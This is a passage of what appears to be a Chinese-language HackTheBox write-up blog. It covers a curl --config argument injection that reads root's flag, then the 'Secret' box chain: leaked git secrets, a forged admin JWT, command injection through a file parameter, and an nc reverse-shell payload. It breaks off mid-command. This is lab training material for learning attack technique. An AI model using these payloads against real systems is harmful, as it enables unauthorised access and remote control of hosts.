version: 2.1+ [+] Python version: 38 [+] Length of package: 6798297 bytes [+] Found 46 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_pkgutil.pyc [+] Possible entry point: pyi_rth_multiprocessing.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: treport.pyc [!] Warning: This script is running in a different Python version than the one used to build the executable. [!] Please run this script in Python38 to prevent extraction errors during unmarshalling [!] Skipping pyz extraction [+] Successfully extracted pyinstaller archive: treport You can now use a python decompiler on the pyc files within the extracted directory https://github.com/LucifielHack/pycdc è¿™é‡Œä½¿ç”¨ä¸€ä¸ªpyå’Œc++çš„åç¼–è¯‘å·¥å…· è¿›å…¥ç›®å½• cmake CMakeLists.txt é€‰æ‹©y â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor/pycdc] â””â”€# cmake CMakeLists.txt 2 â¨¯ -- The C compiler identification is GNU 10.2.1 -- The CXX compiler identification is GNU 10.2.1 -- Detecting C compiler ABI info -- Detecting C compiler ABI info - done -- Check for working C compiler: /usr/bin/cc - skipped -- Detecting C compile features -- Detecting C compile features - done -- Detecting CXX compiler ABI info -- Detecting CXX compiler ABI info - done -- Check for working CXX compiler: /usr/bin/c++ - skipped -- Detecting CXX compile features -- Detecting CXX compile features - done -- Found PythonInterp: /usr/bin/python (found version &quot;2.7.18&quot;) -- Configuring done -- Generating done -- Build files have been written to: /root/Desktop/pyinstxtractor/pycdc â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor/pycdc] â””â”€# make [ 2%] Generating bytes/python_10.cpp, bytes/python_11.cpp, bytes/python_13.cpp, bytes/python_14.cpp, bytes/python_15.cpp, bytes/python_16.cpp, bytes/python_20.cpp, bytes/python_21.cpp, bytes/python_22.cpp, bytes/python_23.cpp, bytes/python_24.cpp, bytes/python_25.cpp, bytes/python_26.cpp, bytes/python_27.cpp, bytes/python_30.cpp, bytes/python_31.cpp, bytes/python_32.cpp, bytes/python_33.cpp, bytes/python_34.cpp, bytes/python_35.cpp, bytes/python_36.cpp, bytes/python_37.cpp, bytes/python_38.cpp, bytes/python_39.cpp, bytes/python_310.cpp [ 4%] Building CXX object CMakeFiles/pycxx.dir/bytecode.cpp.o [ 7%] Building CXX object CMakeFiles/pycxx.dir/data.cpp.o [ 9%] Building CXX object CMakeFiles/pycxx.dir/pyc_code.cpp.o [ 12%] Building CXX object CMakeFiles/pycxx.dir/pyc_module.cpp.o [ 14%] Building CXX object CMakeFiles/pycxx.dir/pyc_numeric.cpp.o [ 17%] Building CXX object CMakeFiles/pycxx.dir/pyc_object.cpp.o [ 19%] Building CXX object CMakeFiles/pycxx.dir/pyc_sequence.cpp.o [ 21%] Building CXX object CMakeFiles/pycxx.dir/pyc_string.cpp.o [ 24%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_10.cpp.o [ 26%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_11.cpp.o [ 29%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_13.cpp.o [ 31%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_14.cpp.o [ 34%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_15.cpp.o [ 36%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_16.cpp.o [ 39%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_20.cpp.o [ 41%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_21.cpp.o [ 43%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_22.cpp.o [ 46%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_23.cpp.o [ 48%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_24.cpp.o [ 51%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_25.cpp.o [ 53%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_26.cpp.o [ 56%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_27.cpp.o [ 58%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_30.cpp.o [ 60%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_31.cpp.o [ 63%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_32.cpp.o [ 65%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_33.cpp.o [ 68%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_34.cpp.o [ 70%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_35.cpp.o [ 73%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_36.cpp.o [ 75%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_37.cpp.o [ 78%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_38.cpp.o [ 80%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_39.cpp.o [ 82%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_310.cpp.o [ 85%] Linking CXX static library libpycxx.a [ 85%] Built target pycxx [ 87%] Building CXX object CMakeFiles/pycdas.dir/pycdas.cpp.o [ 90%] Linking CXX executable pycdas [ 90%] Built target pycdas [ 92%] Building CXX object CMakeFiles/pycdc.dir/pycdc.cpp.o [ 95%] Building CXX object CMakeFiles/pycdc.dir/ASTree.cpp.o [ 97%] Building CXX object CMakeFiles/pycdc.dir/ASTNode.cpp.o [100%] Linking CXX executable pycdc [100%] Built target pycdc â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor/pycdc] â””â”€# ./pycdc /root/Desktop/pyinstxtractor/treport_extracted/treport.pyc # Source Generated with Decompyle++ # File: treport.pyc (Python 3.9) Unsupported opcode: &lt;255&gt; import os import sys from datetime import datetime import re class threat_report: def create(self): Unsupported opcode: &lt;255&gt; file_name = input(&#39;Enter the filename:&#39;) content = input(&#39;Enter the report:&#39;) if &#39;../&#39; in file_name: print(&#39;NOT ALLOWED&#39;) sys.exit(0) file_path = &#39;/root/reports/&#39; + file_name # WARNING: Decompyle incomplete def list_files(self): file_list = os.listdir(&#39;/root/reports/&#39;) files_in_dir = &#39; &#39;.join((lambda .0: [ str(elem) for elem in .0 ])(file_list)) print(&#39;ALL THE THREAT REPORTS:&#39;) print(files_in_dir) def read_file(self): Unsupported opcode: &lt;255&gt; file_name = input(&#39;\\nEnter the filename:&#39;) if &#39;../&#39; in file_name: print(&#39;NOT ALLOWED&#39;) sys.exit(0) contents = &#39;&#39; file_name = &#39;/root/reports/&#39; + file_name # WARNING: Decompyle incomplete def download(self): now = datetime.now() current_time = now.strftime(&#39;%H_%M_%S&#39;) command_injection_list = [ &#39;$&#39;, &#39;`&#39;, &#39;;&#39;, &#39;&amp;&#39;, &#39;|&#39;, &#39;||&#39;, &#39;&gt;&#39;, &#39;&lt;&#39;, &#39;?&#39;, &quot;&#39;&quot;, &#39;@&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;^&#39;, &#39;(&#39;, &#39;)&#39;] ip = input(&#39;Enter the IP/file_name:&#39;) res = bool(re.search(&#39;\\\\s&#39;, ip)) if res: print(&#39;INVALID IP&#39;) sys.exit(0) if &#39;file&#39; in ip and &#39;gopher&#39; in ip or &#39;mysql&#39; in ip: print(&#39;INVALID URL&#39;) sys.exit(0) cmd = &#39;/bin/bash -c &quot;curl &#39; + ip + &#39; -o /root/reports/threat_report_&#39; + current_time + &#39;&quot;&#39; os.system(cmd) # WARNING: Decompyle incomplete é€šè¿‡åˆ†æä¸Šè¿°æºç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨curlå‘½ä»¤æ¥ä¸‹è½½ï¼Œä½†æ˜¯ä½¿ç”¨äº†è¿‡æ»¤ï¼Œæƒ³åŠæ³•æ„é€ è¯­å¥ç»•è¿‡ä¸€ä¸‹å³å¯ code@code:~$ sudo /usr/bin/treport 1.Create Threat Report. 2.Read Threat Report. 3.Download A Threat Report. 4.Quit. Enter your choice:3 Enter the IP/file_name:{--config,/root/root.txt} Warning: /root/root.txt:1: warning: &#39;2f935df00d52a1b17035600df088e81d&#39; is Warning: unknown curl: no URL specified! curl: try &#39;curl --help&#39; or &#39;curl --manual&#39; for more information ç›´æ¥ä½¿ç”¨ä¸‹è½½ï¼Œå¹¶æ„é€ æ¶æ„è¯­å¥è¯»å–æŒ‡å®šçš„æ–‡ä»¶å³å¯ï¼ŒæˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Secret - Hackthebox","slug":"Hackthebox - Secret","date":"2021-12-06T11:38:36.000Z","updated":"2023-05-20T03:08:04.000Z","comments":true,"path":"2021/12/06/Hackthebox - Secret/","link":"","permalink":"http://www.lucifiel.com/2021/12/06/Hackthebox%20-%20Secret/","excerpt":"","text":"Hackthebox - Secreté¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 02:09 EST Nmap scan report for 10.10.11.120 Host is up (0.40s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DUMB Docs 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=11/8%OT=22%CT=1%CU=33102%PV=Y%DS=2%DC=T%G=Y%TM=6188CD7 OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2= OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 851.60 ms 10.10.14.1 2 713.96 ms 10.10.11.120 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 80.73 seconds ç»è¿‡æŸ¥çœ‹åå‘ç°80ç«¯å£å’Œ3000ç«¯å£å†…å®¹ä¸€è‡´ å’±ä»¬å»çœ‹çœ‹80ç«¯å£çš„å†…å®¹ è¿™å¥½åƒæ˜¯ä¸€ä¸ªæ–‡ä»¶ç®¡ç†æœåŠ¡å™¨ä¹‹ç±»çš„ä»€ä¹ˆä¸œè¥¿çš„ï¼Ÿå’±è‹±æ–‡ä¸å¥½ï¼Œå’±ä¹Ÿä¸çŸ¥é“ï¼Œå’±ä¹Ÿä¸æ•¢é—® å³ä¸Šè§’æœ‰ä¸ªæŒ‰é’®Live Demoï¼Œåæ­£ç‚¹äº†ä¹Ÿä¸ä¼šçˆ†ç‚¸ï¼Œç‚¹ç‚¹çœ‹å‘— è¿™æ˜¯APIæ¥å£å•Šï¼Œä½†æ˜¯å¥½åƒæ²¡æœ‰å†…å®¹ï¼Œå’±ä»¬å¾€ä¸‹çœ‹çœ‹ è¿™é‡Œå¥½åƒæ˜¯å¯ä»¥ä¸‹è½½æºä»£ç ï¼Œç®¡ä»–çš„å…ˆä¸‹è½½ä¸‹æ¥çœ‹çœ‹å‘— è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œç„¶åè¿˜æœ‰gitæ–‡ä»¶æ³„éœ²ï¼Œé‚£å°±å…ˆä¸‹è½½ä¸‹æ¥å˜› https://github.com/LucifielHack/GitTools ä¸‹è½½ä¸‹æ¥ååˆ©ç”¨ä¸€ä¸‹ /root/Desktop/GitTools/Extractor/extractor.sh local-web/ dump å†…å®¹æ¯”è¾ƒå¤šï¼Œå’±ä»¬ç­‰ä»–å…ˆä¸‹è½½å®Œå§ï¼Œç­‰çš„æ—¶å€™å¯ä»¥å»çœ‹ä¼šå„¿è§†é¢‘ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump] â””â”€# ls -la æ€»ç”¨é‡ 32 drwxr-xr-x 8 root root 4096 11æœˆ 29 20:53 . drwxr-xr-x 6 root root 4096 11æœˆ 29 20:47 .. drwxr-xr-x 7 root root 4096 11æœˆ 29 20:48 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb drwxr-xr-x 7 root root 4096 11æœˆ 29 20:50 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8 drwxr-xr-x 7 root root 4096 11æœˆ 29 20:51 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b drwxr-xr-x 7 root root 4096 11æœˆ 29 20:52 3-de0a46b5107a2f4d26e348303e76d85ae4870934 drwxr-xr-x 7 root root 4096 11æœˆ 29 20:53 4-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 drwxr-xr-x 7 root root 4096 11æœˆ 29 20:54 5-3a367e735ee76569664bf7754eaaade7c735d702 å®Œæˆåå¯ä»¥çœ‹åˆ°æœ‰æå–å‡ºå…­æ¬¡æ•°æ®ï¼Œå’±ä»¬éšä¾¿è¿›ä¸€ä¸ªçœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb] â””â”€# ls -la æ€»ç”¨é‡ 116 drwxr-xr-x 7 root root 4096 11æœˆ 29 20:48 . drwxr-xr-x 8 root root 4096 11æœˆ 29 20:53 .. -rw-r--r-- 1 root root 219 11æœˆ 29 20:47 commit-meta.txt -rw-r--r-- 1 root root 174 11æœˆ 29 20:47 .env -rw-r--r-- 1 root root 885 11æœˆ 29 20:47 index.js drwxr-xr-x 2 root root 4096 11æœˆ 29 20:47 model drwxr-xr-x 201 root root 4096 11æœˆ 29 20:48 node_modules -rw-r--r-- 1 root root 491 11æœˆ 29 20:48 package.json -rw-r--r-- 1 root root 69452 11æœˆ 29 20:48 package-lock.json drwxr-xr-x 3 root root 4096 11æœˆ 29 20:48 public drwxr-xr-x 2 root root 4096 11æœˆ 29 20:48 routes drwxr-xr-x 4 root root 4096 11æœˆ 29 20:48 src -rw-r--r-- 1 root root 651 11æœˆ 29 20:48 validations.js å¯ä»¥ç¡®å®šæ˜¯ä¸€ä¸ªæºç åº“äº†ï¼Œçªç ´å£åœ¨/routes/auto.jsä¸­ const router = require(&#39;express&#39;).Router(); const User = require(&#39;../model/user&#39;); const bcrypt = require(&#39;bcryptjs&#39;) const jwt = require(&#39;jsonwebtoken&#39;) const { registerValidation, loginValidation} = require(&#39;../validations&#39;) router.post(&#39;/register&#39;, async (req, res) =&gt; { // validation const { error } = registerValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if user exists const emailExist = await User.findOne({email:req.body.email}) if (emailExist) return res.status(400).send(&#39;Email already Exist&#39;) // check if user name exist const unameexist = await User.findOne({ name: req.body.name }) if (unameexist) return res.status(400).send(&#39;Name already Exist&#39;) //hash the password const salt = await bcrypt.genSalt(10); const hashPaswrod = await bcrypt.hash(req.body.password, salt) //create a user const user = new User({ name: req.body.name, email: req.body.email, password:hashPaswrod }); try{ const saveduser = await user.save(); res.send({ user: user.name}) } catch(err){ console.log(err) } }); // login router.post(&#39;/login&#39;, async (req , res) =&gt; { const { error } = loginValidation(req.body) if (error) return res.status(400).send(error.details[0].message); // check if email is okay const user = await User.findOne({ email: req.body.email }) if (!user) return res.status(400).send(&#39;Email is wrong&#39;); // check password const validPass = await bcrypt.compare(req.body.password, user.password) if (!validPass) return res.status(400).send(&#39;Password is wrong&#39;); // create jwt const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET ) res.header(&#39;auth-token&#39;, token).send(token); }) router.use(function (req, res, next) { res.json({ message: { message: &quot;404 page not found&quot;, desc: &quot;page you are looking for is not found. &quot; } }) }); module.exports = router è¿™æ˜¯auto.js å†…çš„æºç ï¼Œå¯ä»¥çœ‹å‡ºæ¥æœ‰/registeræ¥è¯·æ±‚å®ƒ é¦–å…ˆæ·»åŠ ä¸€ä¸ªDNSè§£æ echo 10.10.11.120 secret.htb &gt;&gt; /etc/hosts æ„é€ ä¸€ä¸ªpayloadæ¥æ³¨å†Œç”¨æˆ· curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/register --data &#39;{&quot;name&quot;: &quot;lucifiel&quot;,&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39; ç„¶åä½¿ç”¨æ³¨å†Œçš„ç”¨æˆ·è¿›è¡Œç™»å½• curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/login --data &#39;{&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39; â”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/login --data &#39;{&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39; Note: Unnecessary use of -X or --request, POST is already inferred. * Trying 10.10.11.120:80... * Connected to secret.htb (10.10.11.120) port 80 (#0) &gt; POST /api/user/login HTTP/1.1 &gt; Host: secret.htb &gt; User-Agent: curl/7.74.0 &gt; Accept: */* &gt; Content-Type: application/json &gt; Content-Length: 55 &gt; * upload completely sent off: 55 out of 55 bytes * Mark bundle as not supporting multiuse &lt; HTTP/1.1 200 OK &lt; Server: nginx/1.18.0 (Ubuntu) &lt; Date: Mon, 06 Dec 2021 06:28:56 GMT &lt; Content-Type: text/html; charset=utf-8 &lt; Content-Length: 216 &lt; Connection: keep-alive &lt; X-Powered-By: Express &lt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM &lt; ETag: W/&quot;d8-L4wZphXtP/sfJQE0ke71PfuUMnY&quot; &lt; * Connection #0 to host secret.htb left intact eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM æˆåŠŸç™»å½•å¹¶è·å–åˆ°token æŸ¥çœ‹å¹¶åˆ†æ/routes/verifytoken.jsæ–‡ä»¶çš„å†…å®¹ const jwt = require(&quot;jsonwebtoken&quot;); module.exports = function (req, res, next) { const token = req.header(&quot;auth-token&quot;); if (!token) return res.status(401).send(&quot;Access Denied&quot;); try { const verified = jwt.verify(token, process.env.TOKEN_SECRET); req.user = verified; next(); } catch (err) { res.status(400).send(&quot;Invalid Token&quot;); } }; æˆ‘ä»¬çŸ¥é“äº†JWTä»¤ç‰Œçš„éªŒè¯è¿‡ç¨‹ï¼Œé‚£æˆ‘ä»¬å°±æ„é€ ä¸€ä¸ªpayloadæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å½“å‰çš„æƒé™ curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM&#39; â”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM&#39; {&quot;role&quot;:{&quot;role&quot;:&quot;you are normal user&quot;,&quot;desc&quot;:&quot;lucifiel&quot;}} å¾—åˆ°å›åŒ…ï¼Œæˆ‘ä»¬æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb] â””â”€# cat .env DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39; TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE æŸ¥çœ‹æ ¹ç›®å½•çš„.envæ–‡ä»¶ï¼Œå¾—åˆ°äº†ä¸€æ®µtokne const router = require(&#39;express&#39;).Router(); const verifytoken = require(&#39;./verifytoken&#39;) const User = require(&#39;../model/user&#39;); router.get(&#39;/priv&#39;, verifytoken, (req, res) =&gt; { // res.send(req.user) const userinfo = { name: req.user } const name = userinfo.name.name; if (name == &#39;theadmin&#39;){ res.json({ role:{ role:&quot;you are admin&quot;, desc : &quot;{flag will be here}&quot; } }) } else{ res.json({ role: { role: &quot;you are normal user&quot;, desc: userinfo.name.name } }) } }) router.use(function (req, res, next) { res.json({ message: { message: &quot;404 page not found&quot;, desc: &quot;page you are looking for is not found. &quot; } }) }); module.exports = router é€šè¿‡æŸ¥çœ‹private.jså¾—çŸ¥éªŒè¯é€»è¾‘æ˜¯åªè¦name &#x3D; theadmin å°±æ˜¯adminè´¦æˆ·ï¼Œé‚£æˆ‘ä»¬æ¥ä¼ªé€ ä¸€ä¸ªJWTä»¤ç‰Œå³å¯ ä½¿ç”¨åœ¨çº¿JWTä¿®æ”¹å·¥å…·æˆ–jwt_toolsè¿›è¡ŒJWTä»¤ç‰Œä¿®æ”¹éƒ½å¯ä»¥ https://jwt.io/ https://github.com/ticarpi/jwt_tool åœ¨çº¿å·¥å…·ç„¶åä¼ªé€ ä¸€ä¸ªadminçš„tokenå°±å¯ä»¥äº† è¿™é‡Œéœ€è¦ä¿®æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼ŒæŠŠnameå¤„ä¿®æ”¹ä¸ºtheadminï¼Œç„¶ååœ¨ä¸‹æ–¹æ¡†å†…å¡«å…¥æˆ‘ä»¬åœ¨.envè·å–åˆ°çš„tokenå€¼ï¼Œå³å¯ç”Ÿæˆä¸€æ®µæ–°çš„JWTä»¤ç‰Œ JWT_Toolspython3 jwt_tool.py -I -S hs256 -pc &#39;name&#39; -pv &#39;theadmin&#39; -p &#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#39; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU æˆ‘ä»¬ç»§ç»­ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb] â””â”€# curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39; {&quot;creds&quot;:{&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;theadmin&quot;,&quot;desc&quot;:&quot;welcome back admin&quot;}} æˆ‘ä»¬å»éªŒè¯ä¸€ä¸‹æ–°çš„JWTä»¤ç‰Œï¼Œå‘ç°å·²ç»æ˜¯adminæƒé™äº† é€šè¿‡åˆ†æprivate.jsæ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°å¿…é¡»å°†æ–‡ä»¶åæŒ‡å®šä¸ºå¸¦æœ‰åç§°æ–‡ä»¶çš„getå‚æ•° â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes] â””â”€# curl &#39;http://secret.htb/api/logs?file=/etc/passwd&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39; {&quot;killed&quot;:false,&quot;code&quot;:128,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline /etc/passwd&quot;} çœ‹ç€æ„Ÿè§‰åƒæ˜¯å‘½ä»¤æ³¨å…¥ï¼Ÿ æ¼æ´åˆ©ç”¨â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes] â””â”€# curl &#39;http://secret.htb/api/logs?file=;id&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39; &quot;80bf34c fixed typos ğŸ‰\\n0c75212 now we can view logs from server ğŸ˜ƒ\\nab3e953 Added the codes\\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\\n&quot; OKï¼Œç¡®è®¤æ¼æ´æ˜¯å­˜åœ¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å…ˆä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç„¶åæ¥ç€æ„é€ ä¸€ä¸ªpayloadæ¥è¿›è¡Œåˆ©ç”¨ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes] â””â”€# curl &#39;http://secret.htb/api/logs?file=;rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.12+4444+%3E%2Ftmp%2Ff%0A%0A&#39; -H &#39;auth-token: 